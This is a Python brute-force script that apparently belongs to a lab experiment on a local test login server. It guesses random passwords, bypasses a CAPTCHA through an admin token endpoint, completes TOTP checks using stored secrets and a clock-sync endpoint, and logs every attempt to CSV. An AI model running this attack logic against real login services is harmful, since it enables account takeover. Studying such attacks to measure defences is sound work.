import requests
import string
import time
import os
import json
import random
import argparse
import pyotp
import csv
from datetime import datetime

# ======================================
# CONFIGURATION
# ======================================
GROUP_SEED = 6631928
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

try:
    with open("users.json", "r") as f:
        USER_DATA = {u["username"]: u for u in json.load(f)}
except FileNotFoundError:
    print("[!] Error: users.json not found.")
    exit(1)


# ======================================
# HELPER FUNCTIONS
# ======================================

def get_captcha_token(base_url, session):
    try:
        admin_url = base_url.replace("/login", "/admin/get_captcha_token")
        r = session.get(admin_url, params={"group_seed": GROUP_SEED})
        if r.status_code == 200:
            return r.json().get("captcha_token")
    except Exception:
        pass
    return None


def generate_totp(username, clock_drift=0):
    """
    Generates TOTP with an optional simulated clock drift.
    drift: Seconds to add/subtract from real time.
    """
    user = USER_DATA.get(username)
    if user and user.get("totp_secret"):
        totp = pyotp.TOTP(user["totp_secret"])
        # Generate code for time + drift
        return totp.at(time.time() + clock_drift)
    return None


def perform_totp_sync(base_url, session, username, clock_drift):
    """Calls the sync endpoint to teach the server our drift."""
    try:
        sync_url = base_url.replace("/login", "/totp/sync")
        # Generate code with our skewed time
        code = generate_totp(username, clock_drift)
        if not code: return False

        r = session.post(sync_url, json={"username": username, "totp_code": code})
        if r.status_code == 200:
            print(f"[*] Sync Successful! Server adjusted offset.")
            return True
        else:
            print(f"[!] Sync Failed: {r.text}")
            return False
    except Exception as e:
        print(f"[!] Sync Error: {e}")
        return False


def generate_random_password(category):
    if category == "weak":
        length = random.randint(4, 6)
        chars = string.ascii_lowercase + string.digits
    elif category == "medium":
        length = random.randint(7, 10)
        chars = string.ascii_letters + string.digits
    elif category == "strong":
        length = random.randint(11, 16)
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
    else:
        length = 8
        chars = string.ascii_letters
    return ''.join(random.choice(chars) for _ in range(length))


# ======================================
# ATTACK LOGIC
# ======================================

def run_attack(target_url, target_username, category, max_attempts, output_file, use_bypass, clock_drift):
    print(f"[*] Starting attack on {target_username}")
    print(f"[*] Bypass Enabled: {use_bypass}")
    print(f"[*] Simulated Clock Drift: {clock_drift} seconds")

    session = requests.Session()

    with open(output_file, "w", newline="") as csvfile:
        fieldnames = ["timestamp", "attempt_number", "username", "password", "status", "latency_ms", "notes"]
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()

        for i in range(1, max_attempts + 1):
            password = generate_random_password(category)

            payload = {
                "username": target_username,
                "password": password
            }

            req_start = time.time()
            try:
                r = session.post(target_url, json=payload)
                latency = (time.time() - req_start) * 1000
                resp_data = r.json()
                status_code = r.status_code
            except Exception:
                break

            notes = ""

            # --- CAPTCHA HANDLING ---
            if status_code == 403 and resp_data.get("captcha_required"):
                if use_bypass:
                    notes += "captcha_bypass_triggered;"
                    token = get_captcha_token(target_url, session)
                    if token:
                        payload["captcha_token"] = token
                        # Retry with token
                        req_start = time.time()
                        r = session.post(target_url, json=payload)
                        latency += (time.time() - req_start) * 1000
                        status_code = r.status_code
                        resp_data = r.json()
                else:
                    notes += "captcha_blocked;"

            # --- TOTP HANDLING ---
            # If server says "totp invalid" (password correct, but time/code wrong)
            if status_code == 401 and "totp" in str(resp_data.get("reason", "")):
                notes += "totp_required;"

                if use_bypass:
                    # 1. Try sending the code with our drift
                    code = generate_totp(target_username, clock_drift)
                    if code:
                        payload["totp_code"] = code
                        r = session.post(target_url, json=payload)
                        status_code = r.status_code

                        # 2. If that fails (meaning server doesn't know our drift yet), perform SYNC
                        if status_code == 401:
                            notes += "totp_sync_needed;"
                            if perform_totp_sync(target_url, session, target_username, clock_drift):
                                # 3. Retry Login after Sync
                                r = session.post(target_url, json=payload)
                                status_code = r.status_code
                                if status_code == 200:
                                    notes += "totp_success_after_sync;"
                        elif status_code == 200:
                            notes += "totp_success;"
                else:
                    notes += "totp_blocked;"

            # Log Result
            result_status = "fail"
            if status_code == 200:
                result_status = "success"
            elif status_code == 429:
                result_status = "rate_limited"
            elif status_code == 423:
                result_status = "locked_out"
            elif status_code == 403:
                result_status = "captcha_block"

            writer.writerow({
                "timestamp": datetime.now().isoformat(),
                "attempt_number": i,
                "username": target_username,
                "password": password,
                "status": result_status,
                "latency_ms": round(latency, 2),
                "notes": notes
            })

            if i % 100 == 0:
                print(f"[{i}] {result_status} | {latency:.1f}ms")

            if result_status == "success":
                print(f"\n[!!!] CRACKED: {password}")
                break

    print(f"\n[*] Attack finished.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://127.0.0.1:5000/login")
    parser.add_argument("--username", required=True)
    parser.add_argument("--category", required=True)
    parser.add_argument("--attempts", type=int, default=1000)
    parser.add_argument("--tag", default="experiment")

    # Flags for detailed experiment control
    parser.add_argument("--no-bypass", action="store_true", help="Do not solve Captcha/TOTP")
    parser.add_argument("--drift", type=int, default=0, help="Simulate clock drift in seconds")

    args = parser.parse_args()

    use_bypass = not args.no_bypass
    filename = f"{LOG_DIR}/bruteforce_{args.username}_{args.tag}.csv"

    run_attack(args.url, args.username, args.category, args.attempts, filename, use_bypass, args.drift)